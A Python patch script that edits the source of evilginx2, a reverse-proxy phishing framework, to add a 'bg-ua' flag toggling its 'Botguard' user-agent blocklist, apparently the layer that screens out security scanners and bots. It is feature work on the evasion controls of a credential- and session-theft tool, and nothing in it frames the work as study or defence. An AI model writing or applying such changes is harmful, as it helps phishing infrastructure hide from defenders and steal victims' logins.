#!/usr/bin/env python3
# patch_bg3.py — -bg-ua flag: UA blocklist layer toggle. Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit("[abort] %s: pattern found %dx:\n%s" % (path, n, old[:160]))
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print("[patch] %s OK" % path)

patch("core/http_proxy.go",
      "\tbg_grace          int\n",
      "\tbg_grace          int\n"
      "\tbg_no_ua          bool\n")
patch("core/http_proxy.go",
      "\tp.bg_grace = 8\n",
      "\tp.bg_grace = 8\n"
      "\tp.bg_no_ua = false\n")
patch("main.go",
      'var botguard_grace = flag.Int("bg-grace", 8, "Botguard JS-telemetry grace window in seconds")\n',
      'var botguard_grace = flag.Int("bg-grace", 8, "Botguard JS-telemetry grace window in seconds")\n'
      'var botguard_ua = flag.Bool("bg-ua", true, "Botguard user-agent blocklist layer (disable for lab/puppet runtimes)")\n')
patch("main.go",
      "\thp.SetBotguardGrace(*botguard_grace)\n",
      "\thp.SetBotguardGrace(*botguard_grace)\n"
      "\thp.SetBotguardUAFilter(*botguard_ua)\n")

print("[done] bg-ua patches applied")
